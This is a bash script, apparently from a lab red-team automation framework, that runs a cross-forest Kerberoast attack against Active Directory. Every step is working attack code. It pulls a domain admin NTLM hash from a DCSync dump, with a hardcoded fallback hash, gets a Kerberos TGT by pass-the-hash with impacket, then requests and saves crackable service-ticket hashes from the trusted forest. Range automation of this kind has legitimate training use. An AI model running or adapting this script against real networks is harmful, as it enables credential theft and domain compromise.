#!/bin/bash
# CADRE — WT#033 Cross-Forest Kerberoast (cadre.local DA → range.local)
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#033 — Cross-Forest Kerberoast"
start_attack "033" "Cross-Forest Kerberoast"

if command -v impacket-GetUserSPNs &>/dev/null; then
  GETSPNS() { impacket-GetUserSPNs "$@"; }
  GETTGT() { impacket-getTGT "$@"; }
else
  GETSPNS() { GetUserSPNs.py "$@"; }
  GETTGT() { getTGT.py "$@"; }
fi

require_env DC01 "DC01"
require_env DC03 "DC03"
require_env DOMAIN_ROOT "DOMAIN_ROOT"
require_env DOMAIN_EXT "DOMAIN_EXT"

DA_USER="chief_command"
DCSYNC_FILE="${ATTACKS_DIR:-.}/dcsync_output.txt"
[[ -f "$DCSYNC_FILE" ]] || DCSYNC_FILE="/home/vagrant/attack-matrix/04-automation/linux/attacks/dcsync_output.txt"
DA_HASH=$(grep -m1 'chief_command' "$DCSYNC_FILE" 2>/dev/null | cut -d: -f4)
if [[ -z "$DA_HASH" ]]; then
  DA_HASH="bf389ddd18bae0bef0e4386dc81d8291"
fi
CCACHE="/tmp/cadre-chief_command.ccache"

step "Step 1: Obtain TGT for cadre.local DA (pass-the-hash — password AS-REQ fails etype 18 on Server 2025)"
rm -f "$CCACHE" /tmp/"${DA_USER}.ccache" chief_command.ccache
run_cmd "cd /tmp && GETTGT \"CADRE/${DA_USER}\" -hashes \":${DA_HASH}\" -dc-ip \"$DC01\""
if [[ -f "/tmp/chief_command.ccache" ]]; then mv "/tmp/chief_command.ccache" "$CCACHE"; fi
[[ -f "$CCACHE" ]] || { fail "TGT ccache missing"; exit 1; }

step "Step 2: Cross-forest Kerberoast with TGT (-k)"
export KRB5CCNAME="$CCACHE"
run_cmd "GETSPNS \"${DOMAIN_ROOT}/${DA_USER}\" -k -no-pass -target-domain \"$DOMAIN_EXT\" -dc-ip \"$DC03\" -request -outputfile cross_forest_tgs.txt 2>&1 | tee cross_forest_tgs.log"

step "Step 3: Confirm TGS hash lines"
HASH_COUNT=$(grep -cE '\$krb5tgs' cross_forest_tgs.txt 2>/dev/null || echo 0)
if [[ "$HASH_COUNT" -lt 1 ]]; then
  HASH_COUNT=$(grep -cE '\$krb5tgs' cross_forest_tgs.log 2>/dev/null || echo 0)
fi
if [[ "$HASH_COUNT" -lt 1 ]]; then
  fail "No krb5tgs hash lines captured"
  exit 1
fi
ok "Captured $HASH_COUNT TGS hash line(s)"

result 0 "Cross-Forest Kerberoast completed"
